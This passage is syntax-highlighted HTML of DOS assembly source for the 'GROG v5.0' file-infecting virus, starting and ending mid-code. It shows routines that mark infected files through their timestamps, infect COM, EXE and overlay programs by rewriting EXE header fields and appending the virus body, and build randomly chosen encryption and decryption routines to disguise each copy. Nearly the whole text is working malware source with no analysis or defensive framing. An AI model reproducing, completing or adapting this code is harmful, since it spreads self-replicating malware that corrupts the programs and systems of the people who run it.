         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">origin_off</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store offset of original code of...</span><span class="sc0">
</span><span class="sc5">mark_file</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AX = file time</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11100000b</span><span class="sc0">    </span><span class="sc1">; Clear seconds of file time</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00010001b</span><span class="sc0">    </span><span class="sc1">; Set infection mark (34 seconds)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Save file date at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Load file date from stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Load file time from stack</span><span class="sc0">
</span><span class="sc5">infect_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'-=GROG v5.0 (C) ''93 by GROG - Italy=-'</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Infect COM/EXE/Overlay file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_eof</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">com_exe_ov</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">    </span><span class="sc1">; EXE/Overlay executable?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">move_header</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to move_header</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">write_origin</span><span class="sc0">
</span><span class="sc5">move_header</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc0">  </span><span class="sc1">; SI = offset of file_buffer + 0eh</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">stack_seg</span><span class="sc0">    </span><span class="sc1">; DI = offset of stack_seg</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">      </span><span class="sc1">; Move ten bytes</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">       </span><span class="sc1">; Move ten bytes of file_buffer to...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">sft_segment</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; AX = segment of system file table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES =    "    "    "     "     "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">sft_offset</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DI = offset of system file table</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AX = low-order 16-bits of filesize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; DX = high-order 16-bits of filesize</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000111111111b</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11111110b</span><span class="sc0">
         </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Rotate AH one bit to the right</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">       </span><span class="sc1">; AL = high-order byte of low-orde...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Zero AH</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; High-order 16-bits of filesize e...</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">calc_header</span><span class="sc0">     </span><span class="sc1">; Zero? jump to calc_header</span><span class="sc0">
</span><span class="sc5">pages_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">pages_loop</span><span class="sc0">
</span><span class="sc5">calc_header</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Load DX from stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save DX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Multiply header size in paragrap...</span><span class="sc0">
         </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; DX = header size</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Subtract header size from filesize</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Zero BP</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000000001111b</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Calculate number of bytes in la...?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">calc_pages</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to calc_pages</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; BP = total number of 512-bytes p...</span><span class="sc0">
         </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Negate AL</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00001111b</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Subtract a paragraph from total ...</span><span class="sc0">
</span><span class="sc5">calc_pages</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Add a paragraph to total number ...</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc5">test_pages</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">write_file</span><span class="sc0">      </span><span class="sc1">; Below? Jump to write_file</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_pages</span><span class="sc0">
</span><span class="sc5">write_file</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; CX = number of bytes to write</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; "  "   "    "    "   "    "</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">data_buffer</span><span class="sc0">  </span><span class="sc1">; DX = offset of data_buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">test_read</span><span class="sc0">       </span><span class="sc1">; No error? Jump to test_read</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">test_read</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Add number of bytes actually wri...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Calculate number of bytes in la...?</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">calc_pages_</span><span class="sc0">     </span><span class="sc1">; Above or equal? Jump to calc_pages_</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Load DX from stack</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Increase DX</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save DX at stack</span><span class="sc0">
</span><span class="sc5">calc_pages_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">test_pages_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">calc_cs_ip</span><span class="sc0">      </span><span class="sc1">; Below? Jump to calc_cs_ip</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_pages_</span><span class="sc0">
</span><span class="sc5">calc_cs_ip</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Convert bytes to paragraphs</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Subtract instruction pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack (DX)</span><span class="sc0">
</span><span class="sc5">calc_vir_ptr</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Calculate pointer to virus</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">calc_vir_ptr</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; DX = initial SS relative to star...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">0eeh</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_sof</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">      </span><span class="sc1">; Write eightteen bytes</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_buffer</span><span class="sc0">  </span><span class="sc1">; DX = offset of file_buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_eof</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">grog_crypt_</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">write_origin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_buffer</span><span class="sc0">  </span><span class="sc1">; DX = offset of file_buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">grog_crypt</span><span class="sc0">      </span><span class="sc1">; No error? Jump to grog_crypt</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">grog_crypt</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_sof</span><span class="sc0">
</span><span class="sc5">grog_crypt_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">decrypt_algo</span><span class="sc0">     </span><span class="sc1">; DI = offset of decrypt_algo</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">encrypt_algo</span><span class="sc0">     </span><span class="sc1">; BX = offset of encrypt_algo</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; Generate three encryption/decryp...</span><span class="sc0">
</span><span class="sc5">create_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; AL = 8-bit random number</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; DL = encryption/decryption key</span><span class="sc0">
         </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; AL = 8-bit random number</span><span class="sc0">
         </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; AL =   "     "      "</span><span class="sc0">
</span><span class="sc5">get_rnd_num</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; Subtract twenty from the 8-bit r...</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; Too large a 8-bit random number?</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">get_rnd_num</span><span class="sc0">     </span><span class="sc1">; Above? Jump to get_rnd_num</span><span class="sc0">

         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000000111100b</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">table_begin_</span><span class="sc0">     </span><span class="sc1">; SI = offset of table_begin_</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SI = offset of decryption algori...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Save decryption algorithm at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Load decryption algorithm from s...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Save encryption algorithm at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
